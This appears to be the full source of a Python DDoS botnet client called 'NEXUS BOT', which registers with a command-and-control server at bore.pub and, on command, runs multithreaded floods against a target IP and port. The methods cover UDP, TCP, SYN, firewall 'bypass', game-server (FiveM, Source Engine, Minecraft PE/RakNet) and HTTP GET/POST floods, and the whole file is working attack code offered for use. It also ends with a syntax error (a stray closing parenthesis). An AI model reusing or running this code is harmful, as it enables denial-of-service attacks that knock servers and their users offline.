import subprocess, random, os, time, threading, socket, uuid, struct, platform

# ─── CONFIGURACIÓN ─────────────────────────────────────────────────────────────
C2_ADDRESS = "bore.pub"
C2_PORT = 4390

# ─── VARIABLES GLOBALES ──────────────────────────────────────────────────────
user_attacks = {}
PACKET_SIZES = [1024, 2048, 4096, 8192]
hex_list = [2, 4, 8, 16, 32, 64, 128]

# ─── PAYLOADS ─────────────────────────────────────────────────────────────────
payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
payload_vse = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'

# ─── USER AGENTS ─────────────────────────────────────────────────────────────
base_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

def rand_ua():
    return random.choice(base_user_agents)

# ─── UTILIDADES ──────────────────────────────────────────────────────────────
def get_architecture():
    try:
        result = subprocess.check_output(['uname', '-m'], stderr=subprocess.DEVNULL)
        return result.decode().strip()
    except:
        return 'unknown'

def get_bot_id():
    try:
        with open('/tmp/bot_id.txt', 'r') as f:
            return f.read().strip()
    except:
        bot_id = str(uuid.uuid4())[:8]
        try:
            with open('/tmp/bot_id.txt', 'w') as f:
                f.write(bot_id)
        except:
            pass
        return bot_id

def generate_end(length=4, chara='\n\r'):
    return ''.join(random.choice(chara) for _ in range(length))

def count_cpus():
    try:
        return os.cpu_count() or 4
    except:
        return 4

# ─── OVH BUILDER ─────────────────────────────────────────────────────────────
def OVH_BUILDER(ip, port):
    packet_list = []
    for h2 in hex_list:
        for h in hex_list:
            random_part = "".join(random.choice(
                "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
                "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
                "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
                "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
                "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
                "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
                "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
                "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
                "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
                "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
                "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
                "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
                "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
                "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
                "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
                "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
            ) for _ in range(2048))
            
            paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0', '\\0\\0\\0\\0\\0\\0\\']
            for p in paths:
                end = generate_end()
                packet = (
                    f'PGET {p}{random_part} HTTP/1.1\n'
                    f'Host: {ip}:{port}{end}'
                )
                packet_list.append(packet.encode())
    return packet_list

# ─── MÉTODOS DE ATAQUE ──────────────────────────────────────────────────────

# ─── UDP FLOODS ─────────────────────────────────────────────────────────────

def attack_udp_bypass(ip, port, secs, stop_event):
    """UDP Flood Bypass estándar"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs and not stop_event.is_set():
            packet_size = random.choice(PACKET_SIZES)
            packet = random._urandom(packet_size)
            sock.sendto(packet, (ip, port))
    except:
        pass

def attack_udp_frag(ip, port, secs, stop_event):
    """UDP Fragment Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs and not stop_event.is_set():
            frag_count = random.randint(5, 20)
            for _ in range(frag_count):
                frag_size = random.randint(8, 1500)
                fragment = random._urandom(frag_size)
                sock.sendto(fragment, (ip, port))
            time.sleep(0.001)
    except:
        pass

def attack_udp_game(ip, port, secs, stop_event):
    """UDP Game Query Flood"""
    game_packets = [
        b'\xFE\xFD\x09' + random._urandom(500),
        b'\xFF\xFF\xFF\xFFTSource Engine Query\x00' + random._urandom(400),
        b'\x00' * 12 + random._urandom(300),
        random._urandom(800),
        random._urandom(700),
        b'\xFF\xFF\xFF\xFFgetinfo\x00' + random._urandom(600),
        random._urandom(900),
        b'\xFF\xFF\xFF\xFF\x55' + random._urandom(500),
        random._urandom(850),
        b'\xFF\xFF\xFF\xFFinfo\x00' + random._urandom(400),
        b'\xFF\xFF\xFF\xFF\x49' + random._urandom(600),
        random._urandom(750),
        b'\x00\x00\x00\x00' + random._urandom(500),
        random._urandom(800),
        b'\x50\x41\x4C' + random._urandom(600),
        b'\x03\x00\x00\x00' + random._urandom(400),
        b'\x02' + random._urandom(650),
        b'\xFF\xFF\xFF\xFF\x56' + random._urandom(500),
        b'\xFF\xFF\xFF\xFF\x4D' + random._urandom(450),
        random._urandom(1000),
        b'\x53\x4F\x54' + random._urandom(550),
        b'\x50\x48\x41\x53' + random._urandom(400),
        random._urandom(850),
        b'\x57\x5A' + random._urandom(600),
    ]
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs and not stop_event.is_set():
            for _ in range(random.randint(10, 50)):
                packet = random.choice(game_packets)
                sock.sendto(packet, (ip, port))
            time.sleep(0.001)
    except:
        pass

def attack_udp_pps(ip, port, secs, stop_event):
    """UDP PPS Null Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((ip, port))
        while time.time() < secs and not stop_event.is_set():
            sock.send(b'')
    except:
        pass

def attack_udp_query(ip, port, secs, stop_event):
    """UDP Query Flood"""
    queries = [
        b"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla\r\n\r\n",
        b"POST /api/data HTTP/1.1\r\nContent-Type: application/json\r\n\r\n",
        b"SELECT * FROM users WHERE id=",
        b"CONNECT server.example.com:443 HTTP/1.1\r\n\r\n",
        b"OPTIONS * HTTP/1.1\r\nHost: target.com\r\n\r\n",
        b"QUERY SELECT * FROM database WHERE 1=1",
        b"PING server.example.com\r\n",
    ]
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs and not stop_event.is_set():
            query = random.choice(queries)
            random_bytes = random._urandom(random.randint(50, 500))
            data = query + random_bytes
            sock.sendto(data, (ip, port))
    except:
        pass

# ─── TCP FLOODS ─────────────────────────────────────────────────────────────

def attack_tcp_flood(ip, port, secs, stop_event):
    """TCP Flood Optimizado"""
    end_time = time.time() + secs
    while time.time() < end_time and not stop_event.is_set():
        for _ in range(100):
            if time.time() >= end_time or stop_event.is_set():
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(0.5)
                sock.connect((ip, port))
                payload = random._urandom(random.randint(100, 1400))
                for _ in range(50):
                    if stop_event.is_set():
                        break
                    sock.send(payload)
                sock.close()
            except:
                pass

def attack_tcp_ovh(ip, port, secs, stop_event):
    """TCP OVH Bypass"""
    # Implementación simplificada del ovhtcp.c
    from threading import Thread
    cpus = count_cpus()
    stop_flood = threading.Event()
    
    def tcp_ovh_thread():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while time.time() < secs and not stop_event.is_set() and not stop_flood.is_set():
                packet = random._urandom(random.randint(40, 120))
                sock.sendto(packet, (ip, port))
        except:
            pass
    
    threads = []
    for _ in range(cpus * 2):
        t = Thread(target=tcp_ovh_thread)
        t.daemon = True
        t.start()
        threads.append(t)
    
    time.sleep(secs)
    stop_flood.set()
    for t in threads:
        try:
            t.join(0.1)
        except:
            pass

# ─── OVH ─────────────────────────────────────────────────────────────────────

def attack_ovh_udp(ip, port, secs, stop_event):
    """OVH UDP Bypass"""
    while time.time() < secs and not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = OVH_BUILDER(ip, port)
            for a in packet:
                for _ in range(10):
                    if stop_event.is_set():
                        break
                    sock.sendto(a, (ip, port))
        except:
            pass

def attack_ovh_tcp(ip, port, secs, stop_event):
    """OVH TCP Bypass"""
    while time.time() < secs and not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock2 = socket.create_connection((ip, port))
            sock.connect((ip, port))
            packet = OVH_BUILDER(ip, port)
            for a in packet:
                for _ in range(10):
                    if stop_event.is_set():
                        break
                    try:
                        sock.send(a)
                        sock2.send(a)
                    except:
                        pass
            sock.close()
            sock2.close()
        except:
            pass

# ─── MIX / SYN ──────────────────────────────────────────────────────────────

def attack_tcp_udp_mix(ip, port, secs, stop_event):
    """TCP + UDP Bypass"""
    while time.time() < secs and not stop_event.is_set():
        try:
            packet_size = random.choice(PACKET_SIZES)
            packet = random._urandom(packet_size)
            if random.choice([True, False]):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                while time.time() < secs and not stop_event.is_set():
                    sock.send(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while time.time() < secs and not stop_event.is_set():
                    sock.sendto(packet, (ip, port))
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass

def attack_syn_flood(ip, port, secs, stop_event):
    """TCP SYN Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(False)
        while time.time() < secs and not stop_event.is_set():
            try:
                sock.connect((ip, port))
                packet = random._urandom(random.choice(PACKET_SIZES))
                sock.send(packet)
            except:
                pass
    except:
        pass

# ─── GAME ────────────────────────────────────────────────────────────────────

def attack_fivem(ip, port, secs, stop_event):
    """FiveM Status Ping"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs and not stop_event.is_set():
            sock.sendto(payload_fivem, (ip, port))
    except:
        pass

def attack_vse(ip, port, secs, stop_event):
    """Valve Source Engine Query"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs and not stop_event.is_set():
            sock.sendto(payload_vse, (ip, port))
    except:
        pass

def attack_mcpe(ip, port, secs, stop_event):
    """Minecraft PE Player Simulation"""
    try:
        # Este es un placeholder - el bots.js completo iría aquí
        # Como es muy extenso, usamos un flood UDP simple con payloads de MCPE
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs and not stop_event.is_set():
            sock.sendto(payload_mcpe, (ip, port))
    except:
        pass

def attack_raknet(ip, port, secs, stop_event):
    """RakNet Flood (MCPE)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        while time.time() < secs and not stop_event.is_set():
            # Unconnected Ping
            ping = b'\x01' + struct.pack('>Q', int(time.time() * 1000)) + magic + struct.pack('>Q', random.getrandbits(64))
            sock.sendto(ping, (ip, port))
            # Open Connection Request 1
            req1 = b'\x05' + magic + b'\x07' + random._urandom(1447 - 28)
            sock.sendto(req1, (ip, port))
    except:
        pass

# ─── HTTP ────────────────────────────────────────────────────────────────────

def attack_http_get(ip, port, secs, stop_event):
    """HTTP GET Flood"""
    while time.time() < secs and not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            while time.time() < secs and not stop_event.is_set():
                sock.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
            sock.close()
        except:
            pass

def attack_http_post(ip, port, secs, stop_event):
    """HTTP POST Flood"""
    while time.time() < secs and not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            while time.time() < secs and not stop_event.is_set():
                payload = '757365726e616d653d61646d696e2670617373776f72643d70617373776f726431323326656d61696c3d61646d696e406578616d706c652e636f6d267375626d69743d6c6f67696e'
                headers = (f'POST / HTTP/1.1\r\n'
                           f'Host: {ip}\r\n'
                           f'User-Agent: {rand_ua()}\r\n'
                           f'Content-Type: application/x-www-form-urlencoded\r\n'
                           f'Content-Length: {len(payload)}\r\n'
                           f'Connection: keep-alive\r\n\r\n'
                           f'{payload}')
                sock.send(headers.encode())
            sock.close()
        except:
            pass

def attack_browser(ip, port, secs, stop_event):
    """HTTP Browser Simulator"""
    while time.time() < secs and not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            request = (f'GET / HTTP/1.1\r\n'
                       f'Host: {ip}\r\n'
                       f'User-Agent: {rand_ua()}\r\n'
                       f'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n'
                       f'Accept-Language: en-US,en;q=0.5\r\n'
                       f'Connection: keep-alive\r\n'
                       f'Upgrade-Insecure-Requests: 1\r\n\r\n')
            sock.sendall(request.encode())
            sock.close()
        except:
            pass

# ─── HEX ────────────────────────────────────────────────────────────────────

def attack_hex_flood(ip, port, secs, stop_event):
    """HEX Payload Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs and not stop_event.is_set():
            sock.sendto(payload_hex, (ip, port))
    except:
        pass

def attack_stdhex_flood(ip, port, secs, stop_event):
    """Standard HEX Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        hex_patterns = [
            b'\xde\xad\xbe\xef\xc0\xff\xee\x00',
            b'\xba\xad\xf0\x0d\x0d\x15\xea\x5e',
            b'\xfa\xce\xb0\x0c\xca\xfe\xba\xbe',
            b'\xde\xad\xc0\xde\xf0\x0d\xba\xbe',
            b'\x00\x11\x22\x33\x44\x55\x66\x77',
            b'\x88\x99\xaa\xbb\xcc\xdd\xee\xff',
            b'\x01\x23\x45\x67\x89\xab\xcd\xef',
            b'\xfe\xdc\xba\x98\x76\x54\x32\x10'
        ]
        while time.time() < secs and not stop_event.is_set():
            data = random.choice(hex_patterns) * random.randint(10, 100)
            sock.sendto(data, (ip, port))
    except:
        pass

# ─── UDPBYPASS (MCPE/Game) ─────────────────────────────────────────────────

def attack_udp_bypass_py(ip, port, secs, stop_event):
    """UDP Bypass (MCPE/Game Packets) - Versión Python del udpbypass.py"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        game_packets = [
            b'\xFE\xFD\x09' + random._urandom(500),
            b'\x00\x00\x00\x00' + random._urandom(400),
            b'\xFF\xFF\xFF\xFFTSource Engine Query\x00' + random._urandom(450),
            b'\xFF\xFF\xFF\xFFdetails\x00' + random._urandom(300),
            b'\x00' * 12 + random._urandom(350),
            random._urandom(800),
            random._urandom(700),
            b'\xFF\xFF\xFF\xFFgetinfo\x00' + random._urandom(600),
            random._urandom(900),
            b'\xFF\xFF\xFF\xFF\x55' + random._urandom(550),
            random._urandom(850),
            b'\x03\x00\x00\x00' + random._urandom(400),
            b'\x02' + random._urandom(650),
            b'\xFF\xFF\xFF\xFF\x49' + random._urandom(600),
            random._urandom(750),
            b'\x00\x00\x00\x00' + random._urandom(500),
            random._urandom(800),
            random._urandom(850),
            random._urandom(1200),
        ]
        small_bytes = [
            b'\x00', b'\x01', b'\xFF', b'\xFE\xFD',
            b'\x16\x03', b'\x13\x00',
            b'GET', b'POST', b'HTTP',
            b'\xFF\xFF\xFF\xFF',
            random._urandom(1), random._urandom(2), random._urandom(3), random._urandom(4),
        ]
        http_headers = [
            b'GET / HTTP/1.1\r\nHost: ' + ip.encode() + b'\r\n\r\n',
            b'POST /api HTTP/1.1\r\nHost: ' + ip.encode() + b'\r\n\r\n',
            b'HEAD / HTTP/1.1\r\nHost: ' + ip.encode() + b'\r\n\r\n',
            b'OPTIONS * HTTP/1.1\r\nHost: ' + ip.encode() + b'\r\n\r\n',
        ]
        while time.time() < secs and not stop_event.is_set():
            for _ in range(random.randint(50, 200)):
                rand = random.random()
                if rand < 0.6:
                    packet = random.choice(game_packets)
                elif rand < 0.8:
                    packet = random.choice(small_bytes)
                    if random.random() < 0.5:
                        packet += random._urandom(random.randint(10, 100))
                else:
                    packet = random.choice(http_headers)
                if random.random() < 0.7 and len(packet) < 1000:
                    packet += random._urandom(random.randint(50, 300))
                sock.sendto(packet, (ip, port))
            time.sleep(0.0005)
    except:
        pass

# ─── UDPBYPASS V2 (Firewall) ──────────────────────────────────────────────

def attack_udp_bypass_v2(ip, port, secs, stop_event):
    """UDP Bypass V2 - Versión Python del udpbypassv2.c"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        flood_payloads = []
        base = b'\x05\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78\x08'
        for i in range(10):
            p = bytearray(base)
            p[18] = i
            p[19] = i * 2
            p[20] = i * 4
            p.extend(b'\x00' * (2056 - 21))
            flood_payloads.append(bytes(p))
        
        small_payloads = [
            bytes([0x84,0x9a,0x00,0x00,0x40,0x00,0x48,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa2,0x69]),
            bytes([0x84,0xa0,0x00,0x00,0x40,0x00,0x48,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa2,0x69]),
            bytes([0x84,0x8c,0x00,0x00,0x40,0x00,0x48,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa2,0x69]),
            bytes([0x84,0x8a,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb7,0x1c]),
            bytes([0x84,0x88,0x00,0x00,0x40,0x00,0x48,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa2,0x69]),
            bytes([0x84,0x87,0x00,0x00,0x40,0x00,0x48,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa2,0x69]),
            bytes([0x84,0x01,0x00,0x00,0x60,0x02,0xf0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x13,0x04]),
        ]
        
        while time.time() < secs and not stop_event.is_set():
            if random.random() < 0.8:
                idx = random.randint(0, 9)
                sock.sendto(flood_payloads[idx], (ip, port))
            else:
                idx = random.randint(0, 6)
                sock.sendto(small_payloads[idx], (ip, port))
    except:
        pass

# ─── DISPATCHER ──────────────────────────────────────────────────────────────

def lunch_attack(method, ip, port, secs, stop_event):
    methods = {
        # UDP
        '.UDP': attack_udp_bypass,
        '.UDPFRAG': attack_udp_frag,
        '.UDPGAME': attack_udp_game,
        '.UDPPPS': attack_udp_pps,
        '.UDPQUERY': attack_udp_query,
        '.UDPBYPASS': attack_udp_bypass_py,
        '.UDPBYPASSV2': attack_udp_bypass_v2,
        
        # TCP
        '.TCP': attack_tcp_flood,
        '.TCPOVH': attack_tcp_ovh,
        
        # OVH
        '.OVHUDP': attack_ovh_udp,
        '.OVHTCP': attack_ovh_tcp,
        
        # MIX/SYN
        '.MIX': attack_tcp_udp_mix,
        '.SYN': attack_syn_flood,
        
        # GAME
        '.MCPE': attack_mcpe,
        '.FIVEM': attack_fivem,
        '.VSE': attack_vse,
        '.RAKNET': attack_raknet,
        
        # HTTP
        '.HTTPGET': attack_http_get,
        '.HTTPPOST': attack_http_post,
        '.BROWSER': attack_browser,
        
        # HEX
        '.HEX': attack_hex_flood,
        '.STDHEX': attack_stdhex_flood,
    }
    if method in methods:
        methods[method](ip, port, secs, stop_event)

def start_attack(method, ip, port, duration, thread_count, username):
    stop_event = threading.Event()
    end_time = time.time() + duration

    for _ in range(thread_count):
        t = threading.Thread(target=lunch_attack, args=(method, ip, port, end_time, stop_event), daemon=True)
        t.start()

    if username not in user_attacks:
        user_attacks[username] = []
    user_attacks[username].append((stop_event, thread_count, method, ip, port, duration))

def stop_attacks(username):
    if username in user_attacks:
        for stop_event, _, _, _, _, _ in user_attacks[username]:
            stop_event.set()
        user_attacks[username].clear()
        print(f"[+] Attacks stopped for {username}")

# ─── MAIN ────────────────────────────────────────────────────────────────────

def main():
    backoff = 1
    max_backoff = 60
    bot_id = get_bot_id()
    
    while True:
        c2 = None
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.settimeout(30)
            
            print(f"[*] Connecting to {C2_ADDRESS}:{C2_PORT} (ID: {bot_id})")
            c2.connect((C2_ADDRESS, C2_PORT))

            auth_step = 0
            while auth_step < 2:
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    arch = get_architecture()
                    c2.send(f"{arch}|{bot_id}".encode())
                    auth_step = 1
                elif 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    auth_step = 2
            
            print('✅ Connected to CNC!')
            backoff = 1
            
            last_heartbeat = time.time()
            while True:
                try:
                    c2.settimeout(60)
                    data = c2.recv(1024).decode().strip()
                    
                    if not data:
                        if time.time() - last_heartbeat > 30:
                            c2.send(b'\n')
                            last_heartbeat = time.time()
                        continue
                    
                    print(f"📨 Command: {data[:50]}...")
                    last_heartbeat = time.time()
                    args = data.split(' ')
                    command = args[0].upper()

                    if command == 'PING':
                        c2.send('PONG'.encode())
                    elif command == 'STOP' and len(args) > 1:
                        stop_attacks(args[1])
                    elif command.startswith('.'):
                        try:
                            method = command
                            ip = args[1]
                            port = int(args[2])
                            secs = int(args[3])
                            threads_atk = int(args[4]) if len(args) >= 5 else 5
                            username_atk = args[5] if len(args) >= 6 else "default"
                            print(f"[*] Attacking {ip}:{port} with {method}")
                            start_attack(method, ip, port, secs, threads_atk, username_atk)
                        except Exception as e:
                            print(f"Error: {e}")
                            
                except socket.timeout:
                    try:
                        c2.send(b'\n')
                        last_heartbeat = time.time()
                    except:
                        break
                    continue
                except (ConnectionError, BrokenPipeError, OSError):
                    print("[!] Connection lost")
                    break
                    
        except Exception as e:
            print(f"❌ Error: {e}")
            
        finally:
            try:
                if c2:
                    c2.close()
            except:
                pass
        
        wait = backoff + random.uniform(-0.5, 1)
        print(f"[*] Reconnecting in {wait:.1f}s")
        time.sleep(wait if wait > 0 else 1)
        backoff = min(backoff * 2, max_backoff)

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════╗
    ║         NEXUS BOT - v4.0              ║
    ║         DDoS Bot Client               ║
    ╚═══════════════════════════════════════╝
    """)
    while True:
        try:
            main()
        except KeyboardInterrupt:
            print("\n🛑 Bot stopped")
            break
        except Exception as e:
            print(f"Fatal error: {e}")
            time.sleep(5))
